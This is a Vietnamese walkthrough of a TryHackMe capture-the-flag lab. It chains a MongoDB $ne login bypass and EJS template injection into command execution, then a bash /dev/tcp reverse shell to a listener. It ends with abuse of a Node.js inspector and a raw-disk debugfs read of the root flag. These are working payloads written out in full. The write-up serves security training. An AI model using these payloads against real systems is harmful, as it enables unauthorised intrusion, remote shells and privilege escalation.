Bước 1: Sử dụng gobuster để tiến hành enumeration tìm các endpoint:
gobuster dir -u http://10.49.142.84 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster_http.txt

<img width="1918" height="696" alt="image" src="https://github.com/user-attachments/assets/73d8ea4d-cef8-4713-9054-f6c68e0493f3" />

Sau khi scan ra được 2 endpoint 
/staff 
/logout
Như vậy là trang web này cần đăng nhập để xem thêm.
Bước 2: Sử dụng burpsuite để bypass đăng nhập. Thay thế username và password trong burpsuite bằng: username[$ne]=1&password[$ne]=1
Toán tử $ne là  toán tử truy vấn của MongoDB có nghĩa là "not equal". Thay vì kiểm tra xem thông tin đăng nhập được cung cấp có khớp với tài khoản hiện có 
hay không, hệ thống phụ trợ chấp nhận bất kỳ tài liệu nào có tên người dùng và mật khẩu không = 1 , từ đó bỏ qua quá trình xác thực.

<img width="1920" height="868" alt="image" src="https://github.com/user-attachments/assets/40b5c810-f086-4590-a5e4-c0090c195ea0" />

Như vậy đã vào được trang /staff và lấy được connect.sidcookie. Tiếp theo ta tắt intercept và quay lại trình duyệt
Bước 3: Ta thấy bảng điều khiển dành cho nhân viên cho phép nhân viên tùy chỉnh thông báo xác nhận đặt chỗ bằng cách sử dụng các mẫu JavaScript nhúng (EJS).

<img width="1907" height="842" alt="image" src="https://github.com/user-attachments/assets/668db8e6-6a13-4dce-82f4-a4a81b81a7fc" />

Ta test xem có thực thi được lệnh qua đó không

<img width="1229" height="745" alt="image" src="https://github.com/user-attachments/assets/c413adbb-13fb-4e41-8c13-89d473302a97" />

Như vậy là nó tính toán được nên ta xác nhận được rằng ta có thể chèn mã ở đây.
Bước 4: Chèn mã SSTI để kiếm đường dẫn của node.js
<%=
process.mainModule.require("child_process").execSync("pwd").toString()
%>

<img width="1179" height="783" alt="image" src="https://github.com/user-attachments/assets/75784aa0-5ebd-4faa-9dd9-7a80d59d504d" />

Ở đây ta đã lấy được đường dẫn rồi nên sẽ cat user.txt để lấy flag
 <%=
process.mainModule.require("child_process").execSync("cat /home/poolside/user.txt").toString()
%>
Ta được flag: THM{w4rm_s3ss10n_h1j4ck3d}
<img width="875" height="678" alt="image" src="https://github.com/user-attachments/assets/f3dcab7a-261e-448a-ab4d-a624f02929c4" />

Bước 5: Thiết lập trình lắng nghe để kết nối tcp ra ngoài và thực hiện shellcode
nc  -lvnp  4444

<img width="593" height="115" alt="image" src="https://github.com/user-attachments/assets/ef76ad31-e5c5-4fe3-a3f4-4621cbc9dee4" />

Thực hiện kết nối:
<% const cp =
global.process.mainModule.require('child_process'); cp.spawn('/bin/bash', ['-c', 'bash -i >& /dev/tcp/10.49.117.62/4444 0>&1'],{detached: true, stdio: 'ignore' }).unref() %>

<img width="676" height="330" alt="image" src="https://github.com/user-attachments/assets/e1b428fa-a517-498c-930d-347cf649053d" />

Vào được shell

<img width="1175" height="273" alt="image" src="https://github.com/user-attachments/assets/253ea33c-8f85-454a-a33a-f4823ce64c6e" />

Bước 6: Liệt kê các thành phần network connection, xem port nào đang lắng nghe:
ss -tlnu

<img width="1065" height="520" alt="image" src="https://github.com/user-attachments/assets/7235db01-756a-4e31-ad22-8c5ba7c61e5b" />

Ở đây ta thấy cổng 9229 là cổng mặc định được sử dụng bởi Node.js Inspector , một giao diện gỡ lỗi cho phép các nhà phát triển kiểm tra 
và điều khiển tiến trình Node.js đang chạy. 

Bước 7: Để kiểm tra dịch vụ đang lắng nghe trên cổng 9229 , ta kết nối với Node.js Inspector:
node inspect 127.0.0.1:9229

Sau khi kết nối, ta chuyển sang REPL (Read-Eval-Print Loop). REPL cung cấp một bảng điều khiển JavaScript tương tác, cho phép bạn đánh giá các biểu thức JavaScript 
trong ngữ cảnh của tiến trình Node.js đang chạy. Sau khi kết nối với trình gỡ lỗi, chạy lệnh:
process.getuid ()
process.getgid ()

<img width="994" height="266" alt="image" src="https://github.com/user-attachments/assets/3e7598a8-d6e9-47c6-9679-6fca6c701b7e" />

Việc chạy các lệnh này xác nhận rằng trình gỡ lỗi được gắn vào một tiến trình khác với shell hiện tại của chúng ta. Vì dịch vụ Node.js đang chạy dưới một tài khoản
khác, việc tương tác với nó thông qua trình gỡ lỗi cung cấp quyền truy cập vào ngữ cảnh thực thi và quyền hạn của dịch vụ đó chứ không phải của poolsidengười dùng.
process.getBuiltinModule('child_process').execSync('id').toString()

<img width="1044" height="98" alt="image" src="https://github.com/user-attachments/assets/44cf42e6-75c8-4dd6-93b1-4f2fe3d508b0" />

Chúng ta cũng có thể nhận thấy một nhóm "disk" ở đây. 

<img width="1809" height="219" alt="image" src="https://github.com/user-attachments/assets/b671e674-fe7e-46d4-b5ef-1c25c034e8de" />

Chạy lệnh ta thấy tiến trình Node.js đang chạy pipelinesvcvà thuộc disknhóm. Trên nhiều hệ thống Linux, các thành viên của nhóm này có thể truy cập trực tiếp vào
các thiết bị khối thô, cho phép kiểm tra hệ thống tệp bên dưới.
Bước 8: Nâng quyền
Ứng dụng Node.js sử dụng mô-đun tích hợp child_process để chạy một chương trình bên ngoài. Tài khoản pipelinesvc thuộc nhóm disk, nên trong môi trường này nó có
quyền truy cập trực tiếp vào thiết bị lưu trữ dạng block. Vì vậy, thay vì truy cập trực tiếp /root/root.txt thông qua cơ chế phân quyền thông thường của Linux, 
debugfs có thể được sử dụng để đọc trực tiếp hệ thống tệp trên phân vùng /dev/nvme0n1p1. Hàm child_process.execFileSync() được dùng để khởi chạy debugfs mà không
cần thông qua shell, sau đó truyền cho nó lệnh đọc nội dung của /root/root.txt

process.getBuiltinModule('child_process').execFileSync('/usr/sbin/debugfs', ['-R', ' cat /root/root.txt', '/dev/nvme0n1p1'], { encoding: 'utf8' })

Ta được flag: THM{r4w_d1sk_4cc3ss_w4s_t00_much}
<img width="1891" height="109" alt="image" src="https://github.com/user-attachments/assets/4cc1df42-4e91-4ac9-94c6-a363d2dad2d2" />
